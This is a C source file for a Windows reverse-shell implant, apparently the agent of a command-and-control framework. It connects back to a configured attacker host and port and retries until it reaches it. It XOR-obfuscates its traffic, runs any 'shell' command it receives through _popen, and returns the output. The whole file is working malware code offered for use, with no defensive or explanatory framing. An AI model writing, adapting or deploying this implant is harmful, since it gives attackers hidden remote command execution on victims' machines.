#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "helpers.c"
#include "payload_common.h"

#define MAXBUF 65536

char* CLIENT_IP = LHOST;
int CLIENT_PORT = PORT;
char* key = KEY;
char buf[MAXBUF];


int main(void) {

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		write(2, "[ERROR] WSASturtup failed.\n", 27);
		return (1);
	}
	
	int keylen = strlen(key);
	int n = 0;
	int port = CLIENT_PORT;
	struct sockaddr_in sa;
	int connection_established;
	SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

	#ifdef WAIT_FOR_CLIENT
	while (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		Sleep(5000);
	}
#else
	if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		return (1);
	}
#endif

	char* xorhello = XOR("Hunter Agent v1.0\n", key, 18, keylen);
        send(sock, xorhello, 18, 0);
	free(xorhello);

        while((n = recv(sock, buf, MAXBUF, 0)) > 0)
        {
        	char* xorbuf = XOR(buf, key, n, keylen);
                // TODO: Revamp argument parsing (there's a better way! :)
                if(strncmp(xorbuf, "help\n", 5) == 0)
                {
                	char* xorhelp = XOR(MSG_HELP, key, strlen(MSG_HELP), keylen);
                        send(sock, xorhelp, strlen(MSG_HELP), 0);
			free(xorhelp);
                }

		else if(str_starts_with(xorbuf, "shell") == 1)
		{
			char* cmd = split(xorbuf, " ");
			char shell_msg[50];
			snprintf(shell_msg, 50, "\n[+] Executing command on Agent\n\n");
			char* xorshellmsg = XOR(shell_msg, key, strlen(shell_msg), keylen);
			send(sock, xorshellmsg, strlen(shell_msg), 0);
			free(xorshellmsg);
			FILE* fp;
			char* terminated;
			fp = _popen(cmd, "r");
			if(fp == NULL) {
            	            char* error = "Failed to run command\n";
                            char* xorerror = XOR(error, key, strlen(error), keylen);
                            send(sock, xorerror, strlen(error), 0);
			    free(xorerror);
                                            
                        }

			char path[2050];
                        char command[12000];
                        while (fgets(path, sizeof(path), fp) != NULL) {
                       		printf("Line: %s\n", path);
				strncat(command, path, strlen(path));
                        }
                        char* xordata = XOR(command, key, (int)strlen(command), keylen);
			
                        send(sock, xordata, (int)strlen(command), 0);
			free(xordata);
			memset(command, '\0', strlen(command));

		}

		else if(strncmp(xorbuf, "\n", 1) == 0)
                {
                        char* xornewline = XOR("\n", key, 1, keylen);
                        send(sock, xornewline, 1, 0);
			free(xornewline);
                }

                else
                {
                        char* xorinvalid = XOR(MSG_INVALID, key, strlen(MSG_INVALID), keylen);
                        send(sock, xorinvalid, strlen(MSG_INVALID), 0);
			free(xorinvalid);
                }

	}
	return (0);
}
